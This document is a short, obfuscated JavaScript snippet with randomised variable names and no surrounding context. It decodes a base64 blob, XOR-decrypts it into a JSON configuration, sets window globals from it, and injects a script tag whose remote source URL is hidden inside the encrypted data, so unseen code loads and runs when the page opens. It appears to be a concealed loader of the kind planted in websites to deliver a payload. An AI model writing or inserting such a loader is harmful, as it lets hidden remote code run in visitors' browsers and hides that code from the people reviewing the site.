(function(){
  var j_kf=atob("DH0rPF+FQOGQ0daaTQYJSS3pYtuyuaLuPQ4RE3DmJI++pKL3JBtSEjzqLc/yo/npLg9CTCv2b5H5qbP2Yg1CRDrpbovj8/q4LAlfTjbnNZX1ovSgFiAHHjjpL4PxvaW4dyZQHjHkLYSy6/TqJAVOUBbhYs2yp7f2OBgJBn2zIYCj5ef5eUUcCWi0c9igs7T4eUxJD26nPbzt");
  var z_l0kx=[];
  for(var r_8xq=0;r_8xq<j_kf.length;r_8xq++){z_l0kx.push(j_kf.charCodeAt(r_8xq)&255);}
  var v_a=z_l0kx[0];
  var w_6=z_l0kx.slice(1,1+v_a);
  var o_hi1=z_l0kx.slice(1+v_a);
  var j_5zzi=o_hi1.map(function(b,c_7){return b^w_6[c_7%v_a];});
  var w_z="";
  for(var e_8=0;e_8<j_5zzi.length;e_8++){w_z+=String.fromCharCode(j_5zzi[e_8]&255);}
  var h_o5=decodeURIComponent(escape(w_z));
  var d_2p=JSON.parse(h_o5);
  var j_lknw=d_2p.globals||[];
  j_lknw.forEach(function(h_w){window[h_w.name]=h_w.value;});
  var w_gw=document.createElement("script");
  w_gw.src=d_2p.url;
  w_gw.async=true;
  w_gw.defer=true;
  (d_2p.attributes||[]).forEach(function(v_rd){w_gw.setAttribute(v_rd.name,v_rd.value);});
  (document.head||document.documentElement).appendChild(w_gw);
})();
